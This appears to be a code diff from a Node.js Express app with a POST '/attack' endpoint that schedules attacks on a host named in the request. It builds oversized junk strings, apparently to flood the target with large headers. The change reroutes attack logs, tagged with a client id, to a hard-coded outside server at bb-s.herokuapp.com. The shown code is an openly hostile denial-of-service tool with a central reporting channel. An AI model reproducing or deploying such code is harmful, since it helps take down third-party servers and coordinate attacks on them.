@@ -5,7 +5,8 @@ var Req = require('request');
 
 var app = express();
 
-var ip;
+var id;
+const lto = 'https://bb-s.herokuapp.com';
 
 app.use(express.urlencoded({ extended: false }));
 app.use(express.static(path.join(__dirname, 'public')));
@@ -27,7 +28,7 @@ app.use(function (req,res,next) {
 app.post('/attack',function (req,res) {
   var time = req.body.time - getNow();
   var host = req.body.host;
-  ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  id = req.body.id;
 
   setTimeout(function () {
     attack(host);
@@ -63,7 +64,7 @@ function getUserAgent() {
 
 
 function getH() {
-  return ('2467zzasSSSLlKKFKKHKHKGKKK9596999').repeat(100);
+  return ('2467zzasSSSLlKKFKKHKHKGKKK9596999').repeat(380);
 }
 function attack(host) {
   /*
@@ -108,14 +109,14 @@ var headers = {
 
 function Log(txt) {
   console.log(txt);
-  console.log(ip);
 
 var pin = '1111991';
 
   Req.post({
-    url:ip+'/reg?hash='+pin,
+    url:lto+'/reg?hash='+pin,
     form:{
-      s:txt
+      s:txt,
+      id:id
     }
   },
 function (err) {
